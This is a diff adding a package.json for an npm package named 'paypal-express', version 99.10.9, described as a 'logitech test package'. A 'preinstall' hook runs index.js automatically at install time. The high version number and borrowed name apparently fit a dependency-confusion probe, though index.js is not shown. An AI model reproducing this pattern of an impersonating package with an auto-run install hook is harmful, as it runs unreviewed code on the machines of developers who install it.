@@ -1,0 +1,39 @@
+{
+    "name": "paypal-express",
+    "version": "99.10.9",
+    "description": "logitech test package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "paypal-express@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-lFhFIRk8c3/vbPJ+hyPs70qaZOeBP+Ky98g10kav83bc5ndE8vcuD/XXmU7dNsFhtE4nkKco3DGDQlnEgJZjNw==",
+        "shasum": "8cc9a942a128a730689d2ac72a1d2b96ff014471",
+        "tarball": "https://registry.npmjs.org/paypal-express/-/paypal-express-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3223,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhmnyZCRA9TVsSAnZWagAATJIP/iJDvovVK4t/uweyoZdv\nqwkxw667pbOXzLxhjfHzeL5ovk5P9p0G89b1egZEiUwWHzXyGokYle+dBFQN\n8YpPQauZESOBbtpZVRY/hr3nrr1km2B+yCmncUwT1TWdQfkk+WKL7CQx8qQl\nh++xLin7fg9F8fw6D5WgKsJ7Yhng9NingZeGuegScUIX6vQdbFC01QgxyXJI\npKuJoHS1I0D0nupYv2keg6nxJ6hyZzvjdulok2sZ00X2JUsRYxJXjFRlbdF2\nAiR1Vg/qWGwKNk9PxepndYGwzATo4onOel82BEKg3iJ2cP5ErbmIGM4oagyb\n8mA5bvwG5BODnB1B/NCDcRTUiu+9KOpywwkWpETnW4CXZdFofPmlb6NeJA/0\nMeP4UspWo9hh30njUfnO0RV5s0hlZDYaS1KgLYQf6mS3Ww+8POEKpRrHdqho\nXVG3WEjeDlCwEwM30O682Bfg6NaawG1HmT6S35jz00Ky4rJmpUyj94Y7W9DX\nk6vKpb+gpYfsNvfjeigaQgcxh+bEioqxJuoKesX/WaLGWRxVDdb32wpDB6Cq\nqSqZh0Ggm8iemW3cDOd5W4VB9yvPSqfdBcREaXvfrZD8a8VmpThon9g5hBow\ntBQ4mLnYZABV8Rk4XrXleHZU3R/wcITla2uD+l2sKP56xFfN5U2YR9aTjoDz\nDmaf\r\n=4lFh\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "hussam22",
+        "email": "hussam.tes09@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "hussam22",
+            "email": "hussam.tes09@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/paypal-express_99.10.9_1637514392967_0.45508786552194036"
+    },
+    "_hasShrinkwrap": false
+}
